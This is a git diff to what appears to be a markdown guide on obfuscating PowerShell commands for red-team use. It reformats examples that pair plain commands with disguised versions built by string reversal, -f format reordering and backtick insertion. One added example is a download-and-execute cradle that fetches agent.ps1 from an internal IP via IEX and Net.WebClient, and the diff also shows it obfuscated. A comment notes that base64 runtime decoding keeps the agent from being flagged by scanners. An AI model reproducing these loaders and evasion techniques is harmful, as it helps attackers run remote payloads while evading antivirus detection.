@@ -351,6 +351,11 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 <br />
 
+- String command to obfuscate<br />
+`powershell.exe Get-Date`
+
+- String obfuscated<br />
+
       [Using ::Reverse Switch]
       $reverseCmd='etaD.teG exe.llehsrewop';
       $reverseCmdCharArray= $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
@@ -369,20 +374,32 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       -f accepts strings separated by a comma, and the caret {} contains the string position
       after the -f switch.. HINT: {0} == {vice} | {3} == {et-} | {1} == {Ser} | {2} == {G}
 
-- Using **splatting + reorder** (-f) obfuscation technic
+<br />
 
-      DE-OBFUSCATED : Get-Service
-      OBFUSCATED    : ("{0}{2}{1}{3}" -f'vice','Ser','G','et-')
+- String command to obfuscate<br />
+`Get-Service`
+
+- String obfuscated<br />
+`("{0}{2}{1}{3}" -f'vice','Ser','G','et-')`
 
 ![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)
 
 - **Stacking** commands together with the **&** caret
 
-      DE-OBFUSCATED : Invoke-Expression (New-Object)
-      OBFUSCATED    :("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))
----
+- String command to obfuscate<br />
+`Invoke-Expression (New-Object)`
+
+- String obfuscated<br />
+`("{0}{2}{1}{3}" -f'Invoke','es','-Expr','sion') (&( "{0}{2}{1}" -f'(New','ject)','-Ob'))`
+
+<br />
 
 - Another way to use **splatting + reorder** technic to remote download/execute agent
+
+- String command to obfuscate<br />
+`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/agent.ps1")`
+
+- String obfuscated<br />
 
       I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Download','http://','lie') | I`EX
 
@@ -393,6 +410,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       Using base64 stings decoded at runtime are a Useful obfuscation trick, because
       the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 
 
+<br />
 
 - String command to obfuscate<br />
 `Get-date`
